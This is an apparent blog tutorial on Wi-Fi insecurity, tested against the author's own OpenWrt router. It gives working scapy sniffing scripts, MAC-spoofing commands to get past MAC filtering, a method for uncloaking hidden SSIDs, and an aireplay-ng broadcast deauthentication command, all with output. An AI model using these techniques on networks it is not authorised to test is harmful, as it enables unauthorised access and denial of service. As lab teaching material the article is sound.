---
layout: default
title: articles/wireless-insecurity
category: pages
---

### init() ###

  * VMWare Player + KALI Linux
  * TP-WN822N (USB wireless card)
  * GT-I9000 (Samsung Galaxy S)
  * TP-WR710N (wireless router)

There are tools (Kismet, in particular) which will show you available networks, unmask SSIDs and show you connected clients. But where's the fun in that?

FYI you might need to get the vmware tools installed if you want things like clipboard integration. Do an `apt-get update` followed by `apt-get install open-wm-toolbox` and run `vmware-user-suid-wrapper`.

Boot up KALI. Open a terminal and make sure your wireless adapter has been recognised:

    root@kali:~# iwconfig wlan0
    wlan0     IEEE 802.11bgn  ESSID:off/any  
              Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
              Retry  long limit:7   RTS thr:off   Fragment thr:off
              Encryption key:off
              Power Management:off

Put it in monitor mode (note we shut the interface down first - as it's already up):

    root@kali:~# ifconfig wlan0 down
    root@kali:~# iwconfig wlan0 mode monitor
    root@kali:~# ifconfig wlan0 up
    root@kali:~# iwconfig wlan0
    wlan0     IEEE 802.11bgn  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm   
              Retry  long limit:7   RTS thr:off   Fragment thr:off
              Power Management:off

KALI already has the `scapy` module installed, so we're ready to go.

### Scanning for SSIDs ###

Small confession. I happen to know my router is using channel 8, which can be set as such: `iwconfig wlan0 channel 8`. See, by putting the card in monitor mode ourselves, it only listens to the default channel, and won't hop. There is a simple workaround for this, and it's to use airdump-ng. This creates a new monitor interface (usually `mon0`) which does channel-hopping for us. So let's do that now.

    root@kali:~# airmon-ng start wlan0
    ...
    Interface Chipset   Driver
    
    wlan0   Atheros AR9287  ath9k - [phy0]
            (monitor mode enabled on mon0)
    
    root@kali:~# iwconfig mon0
    mon0      IEEE 802.11bgn  Mode:Monitor  Frequency:2.447 GHz  Tx-Power=20 dBm   
              Retry  long limit:7   RTS thr:off   Fragment thr:off
              Power Management:off

APs send out beacon frames. If the SSID isn't hidden, `scapy` will populate the `info` field on the Dot11 layer.

{% highlight python %}
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11
import logging
import sys
# default logging config to log info out to stdout
logging.basicConfig(level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)])

APs = []
def processPacket(pkt):
    if pkt.haslayer(Dot11Beacon):
        lyr = pkt.getlayer(Dot11)
        if lyr.addr2 not in APs:
            logging.info('AP found  (SSID %s, MAC %s)' % (lyr.info, lyr.addr2))
            APs.append(lyr.addr2)

conf.iface = 'mon0'
sniff(prn=processPacket)
{% endhighlight %}

Save the above in a file called `monitory.py` and run:

    root@kali:~# python monitor.py 2>&1 | grep OpenWrt
    INFO:root:AP found  (SSID OpenWrt, MAC 10:fe:ed:61:fa:e8)

### Level 0x0: MAC Filtering ###

That's not even really considered a security feature, more of an annoyance really.

For now let's assume we know the SSID of the access point we're trying to achieve (we'll try without later). We want to list all the clients attached to this AP.

{% highlight python %}
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11
import logging
import sys
# default logging config to log info out to stdout
logging.basicConfig(level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)])

clients = []
def processPacket(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        lyr = pkt.getlayer(Dot11)
        if lyr.addr2 not in clients :
            logging.info('Probe request for %s from %s' % (lyr.info, lyr.addr2))
            clients.append(lyr.addr2)

conf.iface = 'mon0'
sniff(prn=processPacket)
{% endhighlight %}

And sure enough:

    INFO:root:Probe request for OpenWrt from 00:26:37:97:9a:7e

So now we have the MAC address for one of the client. Let's change ours:

    root@kali:~# ifconfig wlan0 down
    root@kali:~# ifconfig wlan0 hw ether 00:26:37:97:9a:7e
    root@kali:~# ifconfig wlan0 up

And sure enough, we can now connect to the network!

    root@kali:~# ifconfig wlan0
    wlan0     Link encap:Ethernet  HWaddr 00:26:37:97:9a:7e  
              inet addr:192.168.1.188  Bcast:192.168.1.255  Mask:255.255.255.0

Beauty is on the router's side, there's still only one client connected:

    root@OpenWrt:~# iwinfo wlan0 assoclist
    00:26:37:97:9A:7E  -65 dBm / -95 dBm (SNR 30)  200 ms ago
    RX: 58.5 MBit/s, MCS 6, 20MHz                     91 Pkts.
    TX: 43.3 MBit/s, MCS 4, 20MHz, short GI           43 Pkts.

### Level 0x1 ###

Let's step things up a very small notch by hiding the SSID on the router.

    root@OpenWrt:~# uci set wireless.@wifi-iface[0].hidden=1
    root@OpenWrt:~# uci commit
    root@OpenWrt:~# uci show wireless
    root@OpenWrt:~# wifi
    ...
    wireless.@wifi-iface[0].hidden=1

Sure enough the AP now disappears - but it doesn't mean it's no longer broadcasting. It's just not broadcasting its SSID, which the client is required to send to associate itself with the AP. Wait - the client needs to what?

Yes - the client needs to send a probe request containing the SSID. And association is never authenticated. The association process is explained visually [here](https://kb.meraki.com/knowledge_base/80211-association-process-explained). So that means de-cloaking hidden SSIDs is a two-step process:
  
  1. Find APs not broadcasting an SSID
  2. Find clients requesting association to those APs

Scapy pushes the SSID into the `info` field - if an AP is hidden that field will be empty.


Now we just need to wait for a client to associate with the AP, which, depending on the network, could be a very long wait. We can speed things up by broadcasting deauthentication packets to the client. What that means is that it will force the client to try and re-associate with the AP. To do so it will send probe requests, which will contain the SSID. Job, done.

So let's start monitoring and waiting...

{% highlight python %}
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11
import logging
import sys
# default logging config to log info out to stdout
logging.basicConfig(level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)])

hidden_APs = set()
def processPacket(pkt):
  # 1. monitor beacon frames with no SSID
  if pkt.haslayer(Dot11Beacon):
    lyr = pkt.getlayer(Dot11)
    if not lyr.info and lyr.addr2 not in hidden_APs:
      logging.info('found AP with hidden SSID: %s' % lyr.addr2)
      hidden_APs.add(lyr.addr2)
  # 2. monitor for any probe requests to a MAC in hidden_APs
  elif pkt.haslayer(Dot11ProbeResp):
    lyr = pkt.getlayer(Dot11)
    if lyr.addr2 in hidden_APs:
      logging.info('decloacked SSID %s with MAC %s' % (lyr.info, lyr.addr2))

conf.iface = 'mon0'
sniff(prn=processPacket)
{% endhighlight %}

And running this, we soon get:

    INFO:root:found AP with hidden SSID: 10:fe:ed:61:fa:e8
    INFO:root:decloacked SSID OpenWrt with MAC 10:fe:ed:61:fa:e8

Now this only really worked because (again) I cheated a little. I was running the script *before* turning on wifi on the client. Yes it's a little sneaky, because had the client already been associated with the AP we would have needed to wait for it to either disconnect/reconnect, or for another client to join the AP.

All is not lost however and there's a way to speed this up. We can use `aireplay-ng` to send deauth frames to all clients - this will force them to re-authenticate with the AP and send the SSID in clear.

    root@kali:~# aireplay-ng -0 1 -a 10:fe:ed:61:fa:e8 mon0
    00:40:12  Waiting for beacon frame (BSSID: 10:FE:ED:61:FA:E8) on channel 11
    NB: this attack is more effective when targeting
    a connected wireless client (-c <client's mac>).
    00:40:13  Sending DeAuth to broadcast -- BSSID: [10:FE:ED:61:FA:E8]

(Note that aireplay-ng doesn't set the channel - it's up to you to do it via `iwconfig wlan0 channel X` and `iwconfig mon0 channel X`).

Clearly if the AP had no client connected to it, it wouldn't be particularly effective. But then again it all depends on what you're trying to achieve - and whether you have time on your side.

### Level 0x2 ###

Let's up the ante a bit by enabling WEP on the router. And we'll leave the SSID hidden too.
